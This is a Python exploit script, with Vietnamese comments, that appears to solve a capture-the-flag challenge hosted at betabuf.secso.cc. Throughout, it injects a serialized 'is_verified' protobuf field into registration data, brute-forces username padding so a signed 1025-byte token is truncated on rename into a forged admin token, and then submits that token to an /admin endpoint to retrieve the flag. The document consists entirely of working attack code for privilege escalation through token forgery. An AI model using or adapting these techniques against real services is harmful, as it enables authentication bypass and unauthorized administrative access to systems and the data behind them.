import requests
import time
import game_pb2

BASE_URL = "https://betabuf.secso.cc"
SLEEP_INTERVAL = 4 # Tăng thời gian nghỉ lên 4 giây

def register_verified_account():
    print("[*] Bước 1: Đăng ký tài khoản đã được xác thực (verified)...")
    acc_details = game_pb2.AccountDetails(username="pwner", country="XX")
    verified_payload = game_pb2.Registration(is_verified=True)
    malicious_acc_details_hex = (acc_details.SerializeToString() + verified_payload.SerializeToString()).hex()
    invite = game_pb2.RegistrationInvite(invite_id=1, invited_by="intern", expires_at=int(time.time()) + 3600)
    
    r = requests.post(f"{BASE_URL}/register", json={
        "account_details": malicious_acc_details_hex,
        "registration_invite": invite.SerializeToString().hex()
    })
    data = r.json()
    print("[+] Đăng ký thành công, đã có token verified ban đầu.")
    return data['token'], data['signature']

def rename_account(base_token, base_sig, new_username):
    try:
        r = requests.post(f"{BASE_URL}/rename", json={
            "old_user_token": base_token,
            "old_user_token_sig": base_sig,
            "new_username": new_username
        }, timeout=15)
        return r.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Lỗi kết nối khi gọi /rename: {e}")
        return {"error": str(e)}

def create_secure_token(base_token, base_sig):
    print(f"\n[*] Bước 4: Tạo token Secure Connection (nghỉ {SLEEP_INTERVAL}s)...")
    time.sleep(SLEEP_INTERVAL)
    r = requests.post(f"{BASE_URL}/submit_score", json={
        "score": 1, 
        "account_token": base_token,
        "account_token_sig": base_sig
    })
    data = r.json()
    print("[+] Đã tạo thành công token 'SecureConnection'.")
    return data['score'], data['signature']

def get_flag(admin_token, admin_sig, secure_token, secure_sig):
    print(f"\n[*] Bước 5: Gửi payload cuối cùng để lấy flag (nghỉ {SLEEP_INTERVAL}s)...")
    time.sleep(SLEEP_INTERVAL)
    r = requests.post(f"{BASE_URL}/admin", json={
        "account_token": admin_token,
        "account_token_sig": admin_sig,
        "secure_connection_details": secure_token,
        "secure_connection_details_sig": secure_sig
    })
    data = r.json()
    if "flag" in data:
        print("\n[SUCCESS] FLAG LÀ:")
        print(data['flag'])
    else:
        print("\n[!] Lỗi khi lấy flag:")
        print(data)

if __name__ == '__main__':
    verified_token_hex, verified_sig = register_verified_account()
    
    print(f"\n[*] Bước 2: Bắt đầu dò tìm padding cho tấn công Truncation...")
    time.sleep(SLEEP_INTERVAL)
    
    padded_token_hex = None

    # Mở rộng phạm vi dò tìm
    for padding_adjustment in range(-10, 11): 
        token_bytes = bytes.fromhex(verified_token_hex)
        temp_token = game_pb2.AccountToken()
        temp_token.ParseFromString(token_bytes)
        temp_token.username = ""
        base_token_without_username_bytes = temp_token.SerializeToString()

        # Giữ nguyên giả định header là 3 byte, nhưng phạm vi dò tìm rộng sẽ bù lại nếu sai
        header_len_guess = 3
        required_username_len = 1025 - len(base_token_without_username_bytes) - header_len_guess + padding_adjustment

        if required_username_len <= 0: continue

        padded_username = "A" * required_username_len
        
        print(f"[*] Thử với padding adjustment = {padding_adjustment} (username len = {required_username_len})")
        padded_token_data = rename_account(verified_token_hex, verified_sig, padded_username)
        
        current_padded_token_hex = padded_token_data.get('token')
        
        if not current_padded_token_hex:
            print(f"[!] Lỗi khi tạo padded token: {padded_token_data.get('error')}")
        else:
            token_len = len(bytes.fromhex(current_padded_token_hex))
            print(f"    -> Độ dài token trả về: {token_len}")
            if token_len == 1025:
                print("[+] TÌM THẤY ĐỘ DÀI PADDING CHÍNH XÁC!")
                padded_token_hex = current_padded_token_hex
                padded_sig = padded_token_data['signature']
                break
        
        print(f"...Nghỉ {SLEEP_INTERVAL} giây trước khi thử padding tiếp theo...")
        time.sleep(SLEEP_INTERVAL)

    if not padded_token_hex:
        print("\n[!] Không tìm thấy độ dài padding chính xác sau khi đã thử hết các khả năng. Vui lòng kiểm tra lại kết nối và thử lại.")
        exit()

    print(f"\n[*] Bước 3: Thực hiện tấn công Truncation để tạo token admin (nghỉ {SLEEP_INTERVAL}s)...")
    time.sleep(SLEEP_INTERVAL)
    final_admin_token_data = rename_account(padded_token_hex, padded_sig, "B")
    final_admin_token = final_admin_token_data['token']
    final_admin_token_sig = final_admin_token_data['signature']
    print("[+] Đã tạo token admin cuối cùng.")

    secure_token, secure_sig = create_secure_token(verified_token_hex, verified_sig)
    
    get_flag(final_admin_token, final_admin_token_sig, secure_token, secure_sig)